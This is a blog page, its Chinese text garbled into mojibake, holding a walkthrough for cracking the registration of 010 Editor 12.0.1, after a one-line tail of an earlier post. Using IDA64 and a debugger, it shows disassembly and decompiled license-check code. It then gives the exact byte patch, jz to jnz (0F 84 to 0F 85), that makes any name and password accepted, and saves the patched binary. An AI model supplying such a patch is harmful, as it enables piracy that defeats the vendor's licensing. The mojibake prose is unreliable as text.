<p>WndProcä¸»çª—å£è¿‡ç¨‹,åŸºæœ¬ä¸Šå’Œæˆ‘ä»¬è‡ªå·±å†™çš„å·®ä¸å¤šçš„é€»è¾‘,å¤„ç†çš„æ¶ˆæ¯åŸºæœ¬ä¸Šå°±æ˜¯é‚£ä¸€äº›</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/11/010editor%2012.0.1%E6%B3%A8%E5%86%8C%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/11/010editor%2012.0.1%E6%B3%A8%E5%86%8C%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81/" class="post-title-link" itemprop="url">010editor 12.0.1æ³¨å†Œç ´è§£è¡¥ä¸</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-11 21:45:00" itemprop="dateCreated datePublished" datetime="2022-09-11T21:45:00+08:00">2022-09-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-17 01:16:16" itemprop="dateModified" datetime="2024-10-17T01:16:16+08:00">2024-10-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="010editor-12-0-1æ³¨å†Œç ´è§£"><a href="#010editor-12-0-1æ³¨å†Œç ´è§£" class="headerlink" title="010editor 12.0.1æ³¨å†Œç ´è§£"></a>010editor 12.0.1æ³¨å†Œç ´è§£</h1><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911203022928.png" alt="è¿‡æœŸagain"></p>
<p>å·²ç»å—å¤Ÿäº†30å¤©å°±å¾—é‡è£…ä¸€æ¬¡010editor,è¿™æ¬¡ç»™ä»–ä¸€åŠ³æ°¸é€¸ä¸€ä¸‹ç ´è§£å–½</p>
<p>010editorç™»å½•æ³¨å†Œä¸éœ€è¦è”ç½‘,è¿™è¡¨æ˜å®ƒè‡ªå·±å°±å¸¦ç€è´¦æˆ·å¯†ç äº†,æˆ–è€…è¯´ç»™å®šä¸€ä¸ªè´¦æˆ·å®ƒé€šè¿‡æŸäº›å“ˆå¸Œç®—æ³•ç­‰ç­‰å¾—åˆ°ä¸€ä¸²ç‹—å±ä¸åŒçš„æ•°å­—ä½œä¸ºå¯†ç ,æˆ–è€…è¯´Aç”¨æˆ·åå¯¹åº”aå¯†ç ,Bç”¨æˆ·åå¯¹åº”bå¯†ç ç­‰ç­‰</p>
<p>è¿™äº›éƒ½æœ‰å¯èƒ½</p>
<p>åæ­£åªè¦æ˜¯ä¸ç”¨è”ç½‘éº»çƒ¦æœåŠ¡å™¨éªŒè¯ç™»å½•,ä¸€åˆ‡å°±å¥½è¯´</p>
<h2 id="ida64æ‰“å¼€ä¹‹"><a href="#ida64æ‰“å¼€ä¹‹" class="headerlink" title="ida64æ‰“å¼€ä¹‹"></a>ida64æ‰“å¼€ä¹‹</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\<span class="number">010</span>Editor&gt; ida64 <span class="number">010</span>editor</span><br></pre></td></tr></table></figure>

<p>ç­‰ida64åˆ†æå®Œä¹‹å,ç›´æ¥çœ‹å‡½æ•°åˆ—è¡¨æ˜¯ä»¤äººå¤±æœ›çš„,å…¨æ˜¯å“‘å,</p>
<p>è¿ä¸ªstartæˆ–è€…mainæˆ–è€…WinMainå‡½æ•°éƒ½æ‰¾ä¸åˆ°</p>
<p>è¿˜æœ‰ä¸€ç‚¹å„¿å‘ç°å°±æ˜¯010editorä½¿ç”¨Qtå†™çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911203227392.png" alt="image-20220911203227392"></p>
<p>é™æ€åˆ†ææ˜¯çœ‹ä¸å‡ºæ¥äº†,ç”¨åŠ¨æ€çš„</p>
<p>é€‰æ‹©ä½¿ç”¨æœ¬åœ°windowsè°ƒè¯•å™¨,å•¥æ–­ç‚¹ä¹Ÿä¸ç”¨ä¸‹,ç›´æ¥å¼€å§‹è°ƒè¯•</p>
<p>å¿…ç„¶åœ¨æ³¨å†Œé¡µé¢åœä¸‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911203350032.png" alt="image-20220911203350032"></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªçŒœæƒ³æ˜¯,å¤„ç†æ³¨å†ŒæˆåŠŸå’Œå¤±è´¥çš„å‡½æ•°æˆ–è€…è¯´è¿‡ç¨‹ç¦»å¾—ä¸è¿œ,å¯èƒ½æ˜¯åœ¨ä¸€ä¸ªif-elseæ¡ä»¶æ§åˆ¶ä¸‹,å°±è·Ÿwindowsè¿‡ç¨‹å‡½æ•°ä¸€æ ·,å¯¹äºAæ¶ˆæ¯ç”¨è¿™ä¸ªåˆ†æ”¯å¤„ç†,å¯¹äºBæ¶ˆæ¯ç”¨é‚£ä¸ªåˆ†æ”¯å¤„ç†</p>
<p>è¿˜æœ‰ä¸€ä¸ªäº‹å®æ˜¯,è¿™é‡Œèƒ¡ä¹±å°è¯•æ³¨å†Œç”¨æˆ·åå’Œå¯†ç ,æˆåŠŸçš„æœºç‡å¾ˆå°,ä½†æ˜¯å‡ ä¹ç™¾åˆ†ç™¾å¤±è´¥(è¿™ä¸åºŸè¯å—),è¿™æ ·è¯´æ˜¯å› ä¸º,å¯ä»¥é€šè¿‡å¤±è´¥çš„æƒ…å†µçœ‹çœ‹å‘¨å›´æœ‰æ²¡æœ‰æˆåŠŸçš„æƒ…å†µ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911204005784.png" alt="image-20220911204005784"></p>
<p>ä¹±è¾“å…¥ä¸€äº›ä¸œè¥¿ç„¶åCheck License,å¼¹å‡ºå¯¹è¯æ¡†äº†</p>
<p>å¥½äº†ç°åœ¨ç”¨IDAçš„search Text(Alt+T)åŠŸèƒ½å»æŸ¥â€Invalid nameâ€ç­‰å­—æ ·,æœç„¶æŸ¥åˆ°äº†,ä»¤äººæ„æƒ³ä¸åˆ°çš„ç®€å•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF61CE45819 loc_7FF61CE45819:                       ; CODE XREF: sub_7FF61CE45130+61Fâ†‘j</span><br><span class="line">.text:00007FF61CE45819 mov     edx, 90h</span><br><span class="line">.text:00007FF61CE4581E lea     rcx, aInvalidNameOrP            ; &quot;Invalid name or password. Please enter &quot;...</span><br><span class="line">.text:00007FF61CE45825 call    cs:?fromAscii_helper@QString@@CAPEAU?$QTypedArrayData@G@@PEBDH@Z ; QString::fromAscii_helper(char const *,int)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œedx&#x3D;90hæ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦,rcxä¸­å­˜æ”¾çš„æ˜¯å­—ç¬¦ä¸²åŸºåœ°å€</p>
<p>ç„¶åæ¥ç€å°±è°ƒç”¨Qtå‡½æ•°äº†</p>
<p>æˆ‘ä¼°è®¡å’Œwindows32ç¨‹åºè®¾è®¡ä¸­çš„å¯¹è¯æ¡†æˆ–è€…è¯´messageBoxæ˜¯å·®ä¸å¤šçš„ä¸œè¥¿</p>
<p>åœ¨è¿™é‡ŒF5åç¼–è¯‘ä¸€ä¸‹çœ‹çš„æ›´æ¸…æ¥š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v16 != <span class="number">147</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v48 = QString::fromAscii_helper(</span><br><span class="line">          <span class="string">&quot;Invalid name or password. Please enter your name and password exactly as given when you purchased 010 Edit&quot;</span></span><br><span class="line">          <span class="string">&quot;or (make sure no quotes are included).&quot;</span>,</span><br><span class="line">          <span class="number">144</span>i64);</span><br><span class="line">  sub_7FF61CC55065(&amp;v48);</span><br><span class="line">  v25 = (<span class="type">char</span> *)&amp;v48;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_68;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v17 != <span class="number">113</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v48 = QString::fromAscii_helper(<span class="string">&quot;Password accepted but the trial period is already over.&quot;</span>, <span class="number">55</span>i64);</span><br><span class="line">  sub_7FF61CC55065(&amp;v48);</span><br><span class="line">  v25 = (<span class="type">char</span> *)&amp;v48;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_68;</span><br><span class="line">&#125;</span><br><span class="line">v48 = QString::fromAscii_helper(<span class="string">&quot;Password accepted. Your trial period has been extended.&quot;</span>, <span class="number">55</span>i64);</span><br><span class="line">sub_7FF61CC55065(&amp;v48);</span><br><span class="line">v32 = &amp;v48;</span><br></pre></td></tr></table></figure>



<p>é™¤äº†â€Invalid nameâ€¦â€è¿™å¥,è¿˜æœ‰å…¶ä»–å„ç§æƒ…å†µ</p>
<p>æ¯”å¦‚å¯†ç æ­£ç¡®,ä½†æ˜¯è¯•ç”¨æœŸè¿‡äº†,</p>
<p>æ¯”å¦‚å¯†ç æ­£ç¡®,è¯•ç”¨æœŸå·²ç»å»¶é•¿</p>
<p>â€¦</p>
<p>å¯ä»¥çŒœæµ‹,å¯†ç æ­£ç¡®,æ³¨å†ŒæˆåŠŸ è¿™ç§æƒ…å†µä¹Ÿåœ¨é™„è¿‘,åˆ’æ‹‰åˆ’æ‹‰çœ‹çœ‹,è¿˜çœŸå°±æœ‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v17 == <span class="number">219</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF61CC53508(v18, v46);</span><br><span class="line">  v43 = QString::fromAscii_helper(<span class="string">&quot;MMMM d, yyyy&quot;</span>, <span class="number">12</span>i64);</span><br><span class="line">  v26 = (<span class="type">const</span> <span class="keyword">struct</span> QString *)QDate::toString(v46, v47, &amp;v43);</span><br><span class="line">  v27 = (<span class="type">const</span> <span class="keyword">struct</span> QString *)QString::fromUtf8(</span><br><span class="line">                                  &amp;v44,</span><br><span class="line">                                  <span class="string">&quot;Password accepted. This license entitles you to:\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;  - Free Upgrades\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;  - Free Support\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;  - Free Repository Updates\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;\n&quot;</span></span><br><span class="line">                                  <span class="string">&quot;until &quot;</span>,</span><br><span class="line">                                  <span class="number">0xFFFFFFFF</span>i64);</span><br></pre></td></tr></table></figure>

<p>å½“v17&#x3D;219çš„æ—¶å€™,å¯¹åº”å¯†ç é€šè¿‡,æœ‰é©¾é©¶è¯äº†</p>
<p>é‚£ä¹ˆç°åœ¨çš„ç„¦ç‚¹å°±æ˜¯v17,æ€æ ·æ‰èƒ½è®©v17&#x3D;219å‘¢?</p>
<p>åœ¨v17èº«ä¸ŠæŒ‰Xçœ‹äº¤å‰å¼•ç”¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911204910187.png" alt="image-20220911204910187"></p>
<p>Line 157å’ŒLine 197éƒ½æ˜¯å†™æ“ä½œçš„äº¤å‰å¼•ç”¨,å¹¶ä¸”è¿™ä¸¤ä¸ªéƒ½åœ¨sub_7FF61CC584F54å‡½æ•°</p>
<p>åé¢äº”ä¸ªéƒ½æ˜¯è¯»,è¯»å½“ç„¶ä¸ä¼šä¿®æ”¹v17</p>
<p>å»sub_7FF61CC584F54çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ</p>
<p>ç¬‘æ­»,sub_7FF61CC584F54è¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬å½“å‰æ‰€åœ¨å‡½æ•°</p>
<p>å…¶ä¸­ä¼šæ”¹å˜v17çš„æ˜¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v17 = sub_7FF61CC584F4(qword_7FF61D94EE50, <span class="number">13</span>i64, <span class="number">18887</span>i64);</span><br></pre></td></tr></table></figure>

<p>å†å»sub_7FF61CC584F4çœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF61CC584F4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_7FF61CF9AD70(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†å»sub_7FF61CF9AD70çœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF61CF9AD70</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">60</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">275</span>i64;</span><br><span class="line">  v6 = sub_7FF61CC56118(a1, a2, a3);</span><br><span class="line">  <span class="keyword">switch</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">45</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">219</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">78</span>:</span><br><span class="line">      v12 = sub_7FF61CC58FCB(a1, v3);</span><br><span class="line">      v13 = <span class="number">524</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">23</span> )</span><br><span class="line">        v13 = <span class="number">237</span>;</span><br><span class="line">      result = v13;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">231</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">375</span>i64;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      v7 = sub_7FF61CC58FCB(a1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">23</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">113</span>i64;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">42</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 == <span class="number">312</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = sub_7FF61CC55B37(a1);</span><br><span class="line">          v9 = <span class="number">47</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v8 == <span class="number">419</span> )</span><br><span class="line">            v9 = <span class="number">249</span>;</span><br><span class="line">          <span class="keyword">return</span> v9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">375</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = sub_7FF61CC55B37(a1);</span><br><span class="line">      v11 = <span class="number">375</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">419</span> )</span><br><span class="line">        v11 = <span class="number">249</span>;</span><br><span class="line">      result = v11;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦è¿”å›219</p>
<p>éœ€è¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">60</span>) )<span class="comment">//è¿™é‡Œå¾—æ˜¯0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">275</span>i64;</span><br><span class="line">v6 = sub_7FF61CC56118(a1, a2, a3);<span class="comment">//è¿”å›45</span></span><br><span class="line"><span class="keyword">switch</span> ( v6 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">45</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">219</span>i64;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>åœ¨å‰é¢è¿™ä¸ªifä¸Šä¸‹æ–­ç‚¹ç„¶åé‡æ–°å¼€å§‹è°ƒè¯•,ç»“æœå®ƒä¸ä¼šæ‰¾èŒ¬,ç›´æ¥åˆ°</p>
<p><code>v6 = sub_7FF61CC56118(a1, a2, a3);</code>è¿™é‡Œ</p>
<p>å•æ­¥æ­¥è¿‡ä¹‹åv6&#x3D;0x93æ˜¾ç„¶ä¸æ˜¯45,v6å®ƒæ•…æ„æ‰¾èŒ¬</p>
<p>è¿™æ—¶å€™çœ‹çœ‹åæ±‡ç¼–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF61CF9AD95 call    sub_7FF61CC56118</span><br><span class="line">.text:00007FF61CF9AD9A cmp     eax, 2Dh ; &#x27;-&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="å¤±è´¥çš„å°è¯•"><a href="#å¤±è´¥çš„å°è¯•" class="headerlink" title="å¤±è´¥çš„å°è¯•"></a>å¤±è´¥çš„å°è¯•</h2><p>2Dh&#x3D;45d</p>
<p>æ—¢ç„¶v6ä»sub_7FF61CC56118(a1, a2, a3);å‡ºæ¥ç­‰äº0x93,é‚£ä¹ˆæˆ‘å°±è®©v6&#x3D;0x93çš„æ—¶å€™è¿”å›219,ç›´æ¥ä¿®æ”¹æŒ‡ä»¤,å°†2Dhæ”¹æˆ93h</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911211116648.png" alt="image-20220911211116648"></p>
<blockquote>
<p>è¿™ä¸¤æ­¥éƒ½åœ¨Edit-&gt;Patch programèœå•ä¸­</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911211234713.png" alt="image-20220911211234713"></p>
</blockquote>
<p>ç„¶è€Œæ”¹äº†ä¹‹åæ±‡ç¼–æŒ‡ä»¤æˆäº†è¿™æ ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF72357AD9A 83 F8 93                      cmp     eax, 0FFFFFF93h</span><br></pre></td></tr></table></figure>

<p>83F8æ˜¯æ“ä½œç è¿˜æœ‰eax,å‰©ä¸‹ä¸€ä¸ªå­—èŠ‚93æ˜¯ç«‹å³æ•°,è¿™é‡Œåªç»™ç«‹å³æ•°ç•™äº†1ä¸ªå­—èŠ‚,è€Œ93h&#x3D;0x10010011æ­£å¥½ç›¸å½“äºä¸€ä¸ªè´Ÿæ•°,æ”¹äº†ç™½æ”¹</p>
<p>åˆå¾—æ”¹å›å»</p>
<h2 id="æˆåŠŸçš„å°è¯•"><a href="#æˆåŠŸçš„å°è¯•" class="headerlink" title="æˆåŠŸçš„å°è¯•"></a>æˆåŠŸçš„å°è¯•</h2><p>æ”¹æ“ä½œæ•°æŒ‡ä»¤ä¸å¤Ÿé•¿,é‚£ä¹ˆå¯ä»¥æ”¹jzä¸ºjnz</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00007F</span>F72357AD9A <span class="number">83</span> F8 <span class="number">2</span>D                      cmp     eax, <span class="number">2</span>Dh ; <span class="string">&#x27;-&#x27;</span></span><br><span class="line">.text:<span class="number">00007F</span>F72357AD9D <span class="number">0F</span> <span class="number">84</span> C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_7FF72357AE63</span><br></pre></td></tr></table></figure>

<p>åŸæ¥å¾—æ˜¯eax&#x3D;&#x3D;2D,æ‰èƒ½æ»¡è¶³jzè¦æ±‚,ç°åœ¨ç›´æ¥è®©ä»–jnz</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911212949281.png" alt="image-20220911212949281"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF72357AD9D 0F 85 C0 00 00 00             jnz     loc_7FF72357AE63</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è§æ“ä½œç ä»0F84å˜æˆäº†0F85</p>
<p>ç„¶åä¿å­˜ä¿®æ”¹,Apply patches to input fileâ€¦</p>
<blockquote>
<p>æˆ–è€…x64dbgä¹Ÿå¯ä»¥å¹²è¿™ä¸ªäº‹æƒ…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911213946860.png" alt="image-20220911213946860"></p>
</blockquote>
<p>ç„¶åæ‰“å¼€è¡¥ä¸åçš„ç¨‹åº,å·²ç»æ²¡äººæ‰¾èŒ¬äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220911214059651.png" alt="image-20220911214059651"></p>
<p>â€œè¯ä¹¦é¢å‘ç»™:â€</p>
<p>â€œ0ä¸ªç”¨æˆ·è¯ä¹¦â€</p>
<p>å°±å¾ˆå–œæ„Ÿ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/impossible/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
